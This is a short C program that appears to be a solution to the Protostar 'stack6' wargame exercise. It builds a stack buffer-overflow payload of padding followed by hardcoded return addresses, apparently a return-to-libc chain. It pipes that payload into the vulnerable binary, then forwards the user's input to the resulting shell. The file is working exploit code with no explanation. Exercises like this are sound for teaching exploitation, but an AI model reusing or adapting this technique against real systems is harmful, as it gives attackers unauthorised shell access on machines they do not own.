#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char *generate_payload()
{
    int i; char *buffer = (char *) malloc(128);
    for (i = 0; i < 76; i++) {
        *((char *)(buffer+i)) = 'a';
    }
    strncat(buffer, "BBBB" "\xb0\xff\xec\xb7" "\xc0\x60\xec\xb7" "\xda\xff\xff\xbf" "\x0e\x00\x00\x00", 127);
    return buffer;
}

int main(int argc, char *argv[])
{
    int fd[2];
    pid_t childpid;

    if (pipe(fd) == -1)
        return -1;

    if ((childpid = fork()) == -1)
    {
        return -1;
    }
    else if (childpid == 0)
    {
        close(fd[0]);
        char *payload = generate_payload();
        write(fd[1], payload, strlen(payload));
        write(fd[1], "\n", 1);
        free(payload);

        int n; char buffer[256];
        while ((n = read(0, buffer, 256)) > 0)
            write(fd[1], buffer, n);
    }
    else
    {
        close(fd[1]);
        dup2(fd[0], STDIN_FILENO);
        char *env[] = {"/bin/sh", NULL};
        execle("/opt/protostar/bin/stack6", "stack6", NULL, env);
    }
}
